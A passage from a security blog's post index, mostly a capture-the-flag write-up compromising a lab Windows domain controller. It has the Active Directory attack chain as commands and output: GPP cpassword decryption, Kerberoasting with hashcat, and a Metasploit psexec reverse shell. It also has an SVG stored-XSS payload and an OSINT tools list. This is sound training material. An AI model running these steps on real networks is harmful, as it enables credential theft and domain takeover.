TRUE|       isGlobalCatalogReady: TRUE|       domainFunctionality: 4|       forestFunctionality: 4|_      domainControllerFunctionality: 4Service Info: Host: DC; OS: Windows 2008 R2Root Directory Server Agent Service Entry or RootDSE is usually provided LDAP servers and they must provide information about itself and other information that is specific to each server.The ldap-brute script can also be used to conduct brute force attacks on the server using LDAP, however this can be dangeorus and could lock out valid accounts. If Anonymous Bind is enabled , we could conduct ldap search queries to try searching for the base. However, it looks like that is not possible.root@kali:~/Downloads# ldapsearch -h 10.10.10.100 -p 389 -x -b \"dc=active,dc=htb\"# extended LDIF## LDAPv3# base &lt;dc=active,dc=htb&gt; with scope subtree# filter: (objectclass=*)# requesting: ALL## search resultsearch: 2result: 1 Operations errortext: 000004DC: LdapErr: DSID-0C09075A, comment: In order to perform this opera tion a successful bind must be completed on the connection., data 0, v1db1# numResponses: 1SMB EnumerationSince SMB is open, enum4linux can be used to conduct information on that service.root@kali:~/Downloads# enum4linux 10.10.10.100Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sat Jun 22 17:23:52 2019 ========================== |    Target Information    | ========================== Target ........... 10.10.10.100RID Range ........ 500-550,1000-1050Username ......... ''Password ......... ''Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none ==================================================== |    Enumerating Workgroup/Domain on 10.10.10.100    | ==================================================== [E] Can't find workgroup/domain ============================================ |    Nbtstat Information for 10.10.10.100    | ============================================ Looking up status of 10.10.10.100No reply from 10.10.10.100 ===================================== |    Session Check on 10.10.10.100    | ===================================== Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 437.[+] Server 10.10.10.100 allows sessions using username '', password ''Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 451.[+] Got domain/workgroup name:  =========================================== |    Getting domain SID for 10.10.10.100    | =========================================== Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.could not initialise lsa pipe. Error was NT_STATUS_ACCESS_DENIEDcould not obtain sid from servererror: NT_STATUS_ACCESS_DENIED[+] Can't determine if host is part of domain or part of a workgroup ====================================== |    OS information on 10.10.10.100    | ====================================== Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 458.Use of uninitialized value $os_info in concatenation (.) or string at ./enum4linux.pl line 464.[+] Got OS info for 10.10.10.100 from smbclient: Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 467.[E] Can't get OS info with srvinfo: NT_STATUS_ACCESS_DENIED ============================= |    Users on 10.10.10.100    | ============================= Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 866.[E] Couldn't find users using querydispinfo: NT_STATUS_ACCESS_DENIEDUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 881.[E] Couldn't find users using enumdomusers: NT_STATUS_ACCESS_DENIED ========================================= |    Share Enumeration on 10.10.10.100    | ========================================= Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 640.\tSharename       Type      Comment\t---------       ----      -------\tADMIN$          Disk      Remote Admin\tC$              Disk      Default share\tIPC$            IPC       Remote IPC\tNETLOGON        Disk      Logon server share \tReplication     Disk      \tSYSVOL          Disk      Logon server share \tUsers           Disk      Reconnecting with SMB1 for workgroup listing.Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)Failed to connect with SMB1 -- no workgroup available[+] Attempting to map shares on 10.10.10.100Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.//10.10.10.100/ADMIN$\tMapping: DENIED, Listing: N/AUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.//10.10.10.100/C$\tMapping: DENIED, Listing: N/AUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.//10.10.10.100/IPC$\tMapping: OK\tListing: DENIEDUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.//10.10.10.100/NETLOGON\tMapping: DENIED, Listing: N/AUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.//10.10.10.100/Replication\tMapping: OK, Listing: OKUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.//10.10.10.100/SYSVOL\tMapping: DENIED, Listing: N/AUse of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 654.//10.10.10.100/Users\tMapping: DENIED, Listing: N/A ==================================================== |    Password Policy Information for 10.10.10.100    | ==================================================== [E] Unexpected error from polenum:[+] Attaching to 10.10.10.100 using a NULL share[+] Trying protocol 445/SMB...\t[!] Protocol failed: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)[+] Trying protocol 139/SMB...\t[!] Protocol failed: ('Cannot request session', 240, 130)Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 501.[E] Failed to get password policy with rpcclient ============================== |    Groups on 10.10.10.100    | ============================== Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.[+] Getting builtin groups:[E] Can't get builtin groups: NT_STATUS_ACCESS_DENIED[+] Getting builtin group memberships:Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 542.[+] Getting local groups:[E] Can't get local groups: NT_STATUS_ACCESS_DENIED[+] Getting local group memberships:Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 593.[+] Getting domain groups:[E] Can't get domain groups: NT_STATUS_ACCESS_DENIED[+] Getting domain group memberships: ======================================================================= |    Users on 10.10.10.100 via RID cycling (RIDS: 500-550,1000-1050)    | ======================================================================= Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 710.[E] Couldn't get SID: NT_STATUS_ACCESS_DENIED.  RID cycling not possible.Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 742. ============================================= |    Getting printer info for 10.10.10.100    | ============================================= Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 991.could not initialise lsa pipe. Error was NT_STATUS_ACCESS_DENIEDcould not obtain sid from servererror: NT_STATUS_ACCESS_DENIEDenum4linux complete on Sat Jun 22 17:24:30 2019ooking at enum4linux output, the Replication share (//10.10.10.100/Replication) seems to be accessible. SMBClient (smbclient -L 10.10.10.100) can also be used to confirm this.By enumerating this share using smbmap, the following can be seen:root@kali:~/Downloads# smbmap -R Replication -H 10.10.10.100 [+] Finding open SMB ports....[+] User SMB session establishd on 10.10.10.100...[+] IP: 10.10.10.100:445\tName: active.htb                                        \tDisk                                                  \tPermissions\t----                                                  \t-----------\tReplication                                       \tREAD ONLY\t.\\\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\t.\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\t..\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\tactive.htb\t.\\\\active.htb\\\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\t.\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\t..\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\tDfsrPrivate\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\tPolicies\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\tscripts\t.\\\\active.htb\\DfsrPrivate\\\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\t.\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\t..\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\tConflictAndDeleted\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\tDeleted\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\tInstalling\t.\\\\active.htb\\Policies\\\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\t.\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\t..\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\t{31B2F340-016D-11D2-945F-00C04FB984F9}\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\t{6AC1786C-016F-11D2-945F-00C04fB984F9}\t.\\\\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\t.\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\t..\t-r--r--r--               23 Sat Jul 21 06:38:11 2018\tGPT.INI\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\tGroup Policy\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\tMACHINE\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\tUSER\t.\\\\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\Group Policy\\\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\t.\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\t..\t-r--r--r--              119 Sat Jul 21 06:38:11 2018\tGPE.INI\t.\\\\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\t.\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\t..\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\tMicrosoft\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\tPreferences\t-r--r--r--             2788 Sat Jul 21 06:38:11 2018\tRegistry.pol\t.\\\\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Microsoft\\\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\t.\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\t..\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\tWindows NT\t.\\\\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Microsoft\\Windows NT\\\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\t.\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\t..\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\tSecEdit\t.\\\\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\t.\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\t..\t-r--r--r--             1098 Sat Jul 21 06:38:11 2018\tGptTmpl.inf\t.\\\\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\t.\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\t..\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\tGroups\t.\\\\active.htb\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9}\\MACHINE\\Preferences\\Groups\\\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\t.\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\t..\t-r--r--r--              533 Sat Jul 21 06:38:11 2018\tGroups.xml\t.\\\\active.htb\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\\\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\t.\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\t..\t-r--r--r--               22 Sat Jul 21 06:38:11 2018\tGPT.INI\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\tMACHINE\tdr--r--r--                0 Sat Jul 21 06:37:44 2018\tUSER\t.\\\\active.htb\\Policies\\{6AC1786C-016F-11D2-945F-00C04fB984F9}\\MACHINE\\t seems that that Groups.xml file is accessible. In older versions of Windows servers (pre 2012), Groups.xml can be used by system administrator to create local administators within a domain using a domain controller. This file can be fetched using smbmap -R Replication -H 10.10.10.100 -A Groups.xml -q.Looking at the obtained Groups.xml file, the important sections in the groups.xml file are the username and cpassword.&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;Groups clsid=\"{3125E937-EB16-4b4c-9934-544FC6D24D26}\"&gt;&lt;User clsid=\"{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}\" name=\"active.htb\\SVC_TGS\" image=\"2\" changed=\"2018-07-18 20:46:06\" uid=\"{EF57DA28-5F69-4530-A59E-AAB58578219D}\"&gt;&lt;Properties action=\"U\" newName=\"\" fullName=\"\" description=\"\" cpassword=\"edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ\" changeLogon=\"0\" noChange=\"1\" neverExpires=\"1\" acctDisabled=\"0\" userName=\"active.htb\\SVC_TGS\"/&gt;&lt;/User&gt;&lt;/Groups&gt;gpp-decrypt can be used to get the plaintext value of the recovered cpassword.root@kali:~/Downloads# gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ/usr/bin/gpp-decrypt:21: warning: constant OpenSSL::Cipher::Cipher is deprecatedGPPstillStandingStrong2k18Using metasploit’s SMB Login module, these credentials can be used to double check access.msf5 auxiliary(scanner/smb/smb_login) &gt; run[*] 10.10.10.100:445      - 10.10.10.100:445 - Starting SMB login bruteforce[+] 10.10.10.100:445      - 10.10.10.100:445 - Success: 'active.htb\\SVC_TGS:GPPstillStandingStrong2k18'[!] 10.10.10.100:445      - No active DB -- Credential data will not be saved![*] 10.10.10.100:445      - Scanned 1 of 1 hosts (100% complete)[*] Auxiliary module execution completedmsf5 auxiliary(scanner/smb/smb_login) &gt;However, it looks like this user doesn’t have administrator privileges so psexec is not possible.[*] Started reverse TCP handler on 10.10.14.9:4444 [*] 10.10.10.100:445 - Connecting to the server...[*] 10.10.10.100:445 - Authenticating to 10.10.10.100:445|active.htb as user 'SVC_TGS'...[-] 10.10.10.100:445 - Exploit failed [no-access]: RubySMB::Error::UnexpectedStatusCode STATUS_ACCESS_DENIED[*] Exploit completed, but no session was created.Enumeration the shares again using smbmap, the users share seems to be accessible.root@kali:~/Downloads# smbmap -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100[+] Finding open SMB ports....[+] User SMB session establishd on 10.10.10.100...[+] IP: 10.10.10.100:445\tName: active.htb                                        \tDisk                                                  \tPermissions\t----                                                  \t-----------\tADMIN$                                            \tNO ACCESS\tC$                                                \tNO ACCESS\tIPC$                                              \tNO ACCESS\tNETLOGON                                          \tREAD ONLY\tReplication                                       \tREAD ONLY\tSYSVOL                                            \tREAD ONLY\tUsers                                             \tREAD ONLYEnumeration of the SVC_TGS user directories revealed that the user.txt is stored within the user’s desktop.root@kali:~/Downloads# smbmap -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100 -r Users\\\\SVC_TGS\\\\Desktop[+] Finding open SMB ports....[+] User SMB session establishd on 10.10.10.100...[+] IP: 10.10.10.100:445\tName: active.htb                                        \tDisk                                                  \tPermissions\t----                                                  \t-----------\tUsers                                             \tREAD ONLY\t.SVC_TGS\\Desktop                                   \tdr--r--r--                0 Sat Jul 21 11:14:42 2018\t.\tdr--r--r--                0 Sat Jul 21 11:14:42 2018\t..\tfr--r--r--               34 Sat Jul 21 11:14:42 2018\tuser.txtThis can be fetched to get the user token for this machine: smbmap -u SVC_TGS -p GPPstillStandingStrong2k18 -H 10.10.10.100 -R Users -A user.txt -qBloodHoundSome references on how to use BloodHound can be seen below.  https://blog.cptjesus.com/posts/newbloodhoundingestor  https://thenoobsway.com/active-directory-reconnaissance-using-bloodhound/Since we have low privilege credentials, we could authenticate via LDAP and ad-ldap-enum or ldapdomaindump to look for interesting information. However, BloodHound is a better tool for this proces. Since we can’t psexec due to svc_tgs being a service account, runas can been used to start a shell as a low priv user. The following command can be used: runas /netonly /user:active.htb\\svc_tgs cmdOnce that is completed, The BloodHound C# Ingestor “SharpHound” can be used to enumerate LDAP and gather all domain information: .\\SharpHound.exe -c all -d active.htb –DomainController. You will need to ensure that your DNS server configuration on your windows machine is pointing to 10.10.10.100.Importing the SharpHound results into BloodHound and by looking at the results, it looks like the administrator user is kerberoastable due to the user being configured with a SPN.Kerberoasting involves extracting a hash of the encrypted material from a Kerberos “Ticket Granting Service” ticket reply (TGS_REP), which can be subjected to offline cracking in order to retrieve the plaintext password. This is possible because the TGS_REP is encrypted using the NTLM password hash of the account in whose context the service instance is running.Impacket’s GetUserSPNs.py script can be used to request the TGS of the administrator account and extract the hash of this for offline cracking. This can be achieved using Hashcat: hashcat -m 13100 hash.txt /usr/share/wordlists/rockyou.txt --force --potfile-disableHashcat successfully cracked the hash using the rockyou.txt wordlist and the plaintext password of this hash can be seen below.$krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~445*$373e34da642ae2f6fc55a66510e68ee7$9346f3dc8da4fa6b12e3fb663847fb755d729d12d55ca78f341056fd3d38845da008f17f0c08f35f13abd24bd51f4feb9febdcc1c2aa369f4c7d6ad42ce554570a45a933fdbc3f9d2f27be5c954cecd409863258da13af592cfa1765ab5b50fc566bcb4a68b1a00fce1a68d65b4d89a5ff93d1116744567370c052c1945dde973cbf610d5b257643fe4539b7f17d26b907aac87c9a4c493e8793c46eb6b1f8fdee32748261a17ecb6528ca343086109d515b731cc7cd020834df4bad5c47ff041995b4aaec1ca3a1063d47ceed63004ad25b824daff040539290567186632e7c611ee9a5519551d5968b077b944ee965d4de78927abe3bdfbd8b5d9061430904934d1fe44edf03100f63e64888a3268eb6c0ef66ef406dee14aa90ac0c8679ea7948ca2a9c5909aa054487be237017ad8dcf2c483bd750a35b67c813ef7998cde315d13d8429807c452dc865f134a2ba5a214f07594712f141a7f5af48d145e54d5e4c09d5942a29386f33a4773e3aa5dc3fa4fb271ee81e7daa3340339a44f2725a758cec4f7748727f7b018cab8dde4fbcefcbfab225d4ef910d863b6a4e37e039e0aff33825fd40be982e13946ee645ff72778fbe3c5fe10b695efb31bfca097afff3e1e0e8421fbd49334bab43017761293a2433b45aefc67f4abf809e0e3075b619f6b1e309924b6ae007632d9000c88038d547881787f5609398c810ca0a2d279a149df82759ddc59648a663ad8f764b45b915d170bf457f20e14a621f7ee4032bca48e9a0e2a2d6aa477e3e0375b7f4a2418aa0f6f5e06a2e2a307667eec40b6999fa6529a233f90092171ee09de00e6cc3b6f17f0a620c981bff474fed62d1f4211bce51fe28cae747ebaac12de512437aef20a05457051adec6ec65e649a570671360b107b3330b479af227910f9074f1abb26f7602a1821cff3b044c754909c8fbe164f69254bbcc8e6c2d026f9e973e364f7ad53b6b22c33a4fb1e8b7b8a5948133471172f9d4e01580b16105ee277a8136935f6be751753b1c8ea0bcd6b5d503884db5364b7485e4294935fc2129867b7918d17a56a4dacbda7f77f0dca04b1d6ccd0b5ded7f43f5721c9b22e37d07cea1c01caedf3a4324a7058452204baedf85d48cab02aeffc905aa054864fd128f2ca456d86ab0c97698df3fc3058233c95428d9c7ac54ed5aa603a4f21944576241f970ddd594d880372500bcffd677bde516ee75d18463dae717cef842de7bf7d9c03146:Ticketmaster1968                                                 Session..........: hashcatStatus...........: CrackedHash.Type........: Kerberos 5 TGS-REP etype 23Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active/CIFS~4...c03146Time.Started.....: Thu Jul  4 19:55:19 2019 (27 secs)Time.Estimated...: Thu Jul  4 19:55:46 2019 (0 secs)Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)Guess.Queue......: 1/1 (100.00%)Speed.#1.........:   394.9 kH/s (6.04ms) @ Accel:32 Loops:1 Thr:64 Vec:8Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) SaltsProgress.........: 10539008/14344385 (73.47%)Rejected.........: 0/10539008 (0.00%)Restore.Point....: 10534912/14344385 (73.44%)Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1Candidates.#1....: Tioncurtis23 -&gt; ThelittlemermaidStarted: Thu Jul  4 19:55:09 2019Stopped: Thu Jul  4 19:55:46 2019Using the password Ticketmaster1968, psexec can be used to login to the system and get root.txt. wmiexec from impacket and pth-wmis can also be used instead of MetaSploit psexec.msf5 &gt; use exploit/windows/smb/psexecmsf5 exploit(windows/smb/psexec) &gt; set RHOSTS 10.10.10.100RHOSTS =&gt; 10.10.10.100msf5 exploit(windows/smb/psexec) &gt; set SMBDomain active.htbSMBDomain =&gt; active.htbmsf5 exploit(windows/smb/psexec) &gt; setg SMBUser AdministratorSMBUser =&gt; Administratormsf5 exploit(windows/smb/psexec) &gt; setg SMBPass Ticketmaster1968SMBPass =&gt; Ticketmaster1968msf5 exploit(windows/smb/psexec) &gt; run[*] Started reverse TCP handler on 10.10.14.41:4444 [*] 10.10.10.100:445 - Connecting to the server...[*] 10.10.10.100:445 - Authenticating to 10.10.10.100:445|active.htb as user 'Administrator'...[*] 10.10.10.100:445 - Selecting PowerShell target[*] 10.10.10.100:445 - Executing the payload...[+] 10.10.10.100:445 - Service start timed out, OK if running a command or non-service executable...[*] Sending stage (179779 bytes) to 10.10.10.100[*] Meterpreter session 1 opened (10.10.14.41:4444 -&gt; 10.10.10.100:57298) at 2019-07-04 20:15:59 -0400The root hash can be found within the Administrator’s desktop.C:\\Users\\Administrator\\Desktop&gt;type root.txttype root.txtb5fc76d1d6b91d77b2fbf2d54d0f708bC:\\Users\\Administrator\\Desktop&gt;"
  },
  
  {
    "title": "Ghost Publishing Platform – SVG Image Upload to Stored Cross-site scripting",
    "url": "/posts/ghost_svg_image_upload_to_xss/",
    "categories": "web application security",
    "tags": "ghost xss",
    "date": "2018-09-21 03:25:52 +0800",
    





    
    "snippet": "Often when looking for Stored Cross-site scripting (XSS) vulnerabilities, file upload functionalities can be targeted. This will include trying to upload an HTML file or a Flash SWF file that conta...",
    "content": "Often when looking for Stored Cross-site scripting (XSS) vulnerabilities, file upload functionalities can be targeted. This will include trying to upload an HTML file or a Flash SWF file that contains malicious JavaScript. if it is possible successfully upload these file formats and view these stored files directly, then stored XSS is possible. Scalable Vector Graphics (SVG) file formats are often overlooked during this process. This short blog post will look at how SVG documents can be uploaded and leveraged to execute malicious JavaScript on a domain to achieve Stored XSS. Scalable Vector Graphics (SVG).Scalable Vector Graphics (SVG) can be used to define vector-based graphics within a webpage. SVG can be mixed with HTML content, as well as XML namespaces. SVG can be used to create interactivity within a webpage and perform animations. It should be noted that even though the MIME type for an SVG image is image/svg+xml. It is possible to store JavaScript code within an SVG document and execute it if viewed directly within a web browser. An example proof on concept for this can be seen below&lt;svg version=\"1.1\" baseProfile=\"full\" xmlns=\"http://www.w3.org/2000/svg\"&gt;    &lt;circle cx=\"50\" cy=\"50\" r=\"40\" stroke=\"black\" stroke-width=\"3\" fill=\"red\" /&gt;   &lt;script type=\"text/javascript\"&gt;      alert(document.domain);      alert(document.location);   &lt;/script&gt;&lt;/svg&gt;The above SVG document can be saved as a .svg file and can be opened and viewed within any browser to execute JavaScript which will display the current domain and the full URL of the domain that the the JavaScript is executing from.It is also possible to embed the above SVG document as part of a HTML page and when rendered, will execute the specified JavaScript. However, it is not possible execute JavaScript through SVG by loading an externally stored SVG file. For example, the following ways cannot be used to execute JavaScript within a webpage.&lt;img src=\"https://snoopysecurity.github.io/test.svg\" alt=\"test\" \"&gt;However, in certain scenarios an  element can be used to load and embed an SVG document externally.&lt;object id=\"test\" data=\"https://snoopysecurity.github.io/test.svg\"&gt;&lt;/object&gt;&lt;embed src=\"https://snoopysecurity.github.io/test.svg\" /&gt;Ghost Publishing PlatformGhost is an open source publishing platform which allows a user to create public and private blogs. It was found that during creation of a new blog post, upload of SVG files as document was allowed by the application.The below screenshot shows that an SVG file was successfully uploaded and rendered by the application.The image location of the stored SVG document can be visited to execute the stored JavaScript.Cross Site Scripting (XSS) allows clients to inject arbitrary scripting code into application and have the server return the script to the client in the response. This occurs because the application is taking untrusted data (in this example, as form of an SVG file) and storing it without performing any validation or encoding.This vulnerability could potentially be leveraged by an editor or an author of a post to steal the session of an administrator."
  },
  
  {
    "title": "Top 10 OSINT Tools/Sources for Security Folks",
    "url": "/posts/_OSINT_for_security_folks/",
    "categories": "OSINT",
    "tags": "osint",
    "date": "2018-08-21 11:33:00 +0800",
    





    
    "snippet": "Open-source intelligence (OSINT) refers to techniques used to collect data from publicly available sources that can be used for enumeration or attacking a target further. This blog post will provid...",
    "content": "Open-source intelligence (OSINT) refers to techniques used to collect data from publicly available sources that can be used for enumeration or attacking a target further. This blog post will provide information on certain well-known OSINT tools and how they can be used to collection and analyse information.10 Harpoon: an OSINT / Threat Intelligence toolLink: Harpoon: an OSINT / Threat Intelligence toolHarpoon is a quite recent addition to the OSINT field. Harpoon is a plugin-based tool and it can be used to search multiple services such as Malshare, Spyonweb, Certspotter, Binaryedge and Asn for data. The tool is also organised in plugins which makes it easier to write plugins to perform useful tasks. Furthermore, this tool seems more focused on threat hunting compared to bug bounty hunting and red teaming.9 - BinaryEdge Software as a serviceLink: BinaryedgeBinaryEdge is a platform that gathers data and makes the accessible for a user through their API. This platform is similar to Shodan; and provides information regarding exposed ports/services, banner grabs, torrent information, DNS queries and much more.8 - Hunter.ioLink: Hunter.ioWhen targeting an organisation, services such as search engines (e.g. Google, Yahoo, Bing) can be used to search for email addresses associated with a domain that a target organization uses for their business. Tools such as linkedin2username and ScrapedIn can also be used to scrape LinkedIn for potential targets without API restrictions for data reconnaissanceHunter.io can also be useful when trying to find email addresses related to a domain. The Hunter service is used for sales personnel to find contacts and leads for an organisation but this service can also be used to collect email addresses as well as names, job titles, and phone numbers.7 Censys.ioLink: Censys.ioCensys is a service that scans the Internet searching for devices and return aggregate reports on how resources (i.e. Devices, websites, and certificates) are configured and deployed. This service also provides a search engine that can be used to search for this information. Due to its feature of showing real-time data, this service can often be useful for bug bounty hunters to quickly map out easy targets.The below search is an example of looking for any service/server with its SSL/TLS certificate that can correlates to the search term “PayPal”The above search utilises Certificate Transparency. Certificate Transparency by design contains all the certificates issued by a participating CA for any given domain. Search engines such as crt.sh also collects this data.6 Open Source Intelligence Browser ExtensionLink: Open Source Intelligence Browser ExtensionThe Open Source Intelligence Browser extension that can be used to quickly search for information by leveraging the Chrome browser. This extension can be useful during Intelligence (OSINT) Investigations. This includes username, telephone, domain and company searches.5 WhatWeb ScannerLink: WhatWeb ScannerWeb technologies including content management systems (CMS), blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded devices. WhatWeb has over 1700 plugins, each to recognise something different. WhatWeb also identifies version numbers, email addresses, account IDs, web framework modules, SQL errors, and more.WhatWeb is a scanner that conducts web application fingerprinting. This technique often be useful for bug bounty hunters. WhatWeb contains over 1700 plugins which can be customised and used for fingerprinting and can be used to gather information on a variety of application servers including Content Management Systems, Application servers and web application dashboards. An example of WhatWeb scanner in use can be seen below:$ ./whatweb exampletargetsite.com/forum/http://exampletargetsite.com/forum/ [200] PasswordField[password], HTTPServer[Apache/2.2.15], PoweredBy[phpBB], Apache[2.2.15], IP[88.198.177.36], phpBB[2], PHP[5.2.13], X-Powered-By[PHP/5.2.13], Cookies[phpbb2mysql_data,phpbb2mysql_sid], Title[Smartors Mods Forums - Reloaded], Country[GERMANY][DE]4 Intrigue.ioLink: Intrigue.ioIntrigue.io is a framework that was created for automated attack surface discovery. This framework can be used for port scanning, service discovery, DNS recon as well as search for third party services such as Pastebin, Github etc. Intrigue.io also contains a web interface which can be used to quickly configure and start automated discovery scans. Intrigue.io can also be used as a Vagrant or docker container. I prefer to use Aquatone these days for attack surface discovery3 AquatoneLink: AquatoneAquatone is a well-supported and updated tool that can be used to scan large number of hosts and quickly get information regarding an organization’s attack surface. Aquatone has several features including DNS enumeration, port scanning, as well as screenshotting and reporting. Aquatone can also be easily integrated with existing toolsets with minimal effort.2 Recon-NgLink: Recon-ngRecon-Ng is an extremely powerful web reconnaissance framework which can be used by security consultants to gather OSINT data quickly. Recon-Ng follows a modular approach similar to the MetaSploit framework, and also provides useful usability features such as interactive help, and command completion. Recon-Ng contains numerous modules including DNS, Email and Web application reconnaissance. Numerous bug bounty scripts/wrappers have utilised Recon-Ng in the past including enumall.py by @Jhaddix.1 SpiderFootLink: SpiderFootSpiderFoot is an open source intelligence (OSINT) reconnaissance tool that can be used to gather IP addresss, domain names, hostnames, network subnets, ASNs, e-mail addresses of a given search name. SpiderFoot can be used to query over 100 public data sources (OSINT) and is updated monthly with updates. SpiderFoot can also be configured with public data source APIs; a full list of documentation can be found here: https://www.spiderfoot.net/documentation/Concluding thoughtsMost of these tools can be used to gather port scan information, search engine dorks, python scripting, passive DNS, Threat intelligence, data visualization, Social Media, SSL/TLS certificates, WHOIS, Autonomous System (AS) Numbers, Cloud information, Wayback Machine, Web crawling, mail exchange information and much more. These are a few tools I use on a regular basis.Honourable mentions: Wapplyzer, Trape, EagleEye, RiskIQ, Skiptracer, Sn1per, Dnsdumpster, Gitrob"
  },
  
  {
    "title": "phppgadmin CSRF to Code Execution",
    "url": "/posts/28_phppgadmin_csrf_to_code-execution/",
    "categories": "web application security",
    "tags": "phppgadmin",
    "date": "2018-07-29 03:25:52 +0800",
    





    
    "snippet": "This advisory discloses a CSRF vulnerability that exists in phppgadmin/phppgadmin. The details that was sent to the maintainer can be seen here: phppgadmin%20CSRF%20Vulnerability.pdfCSRF Introducti...",
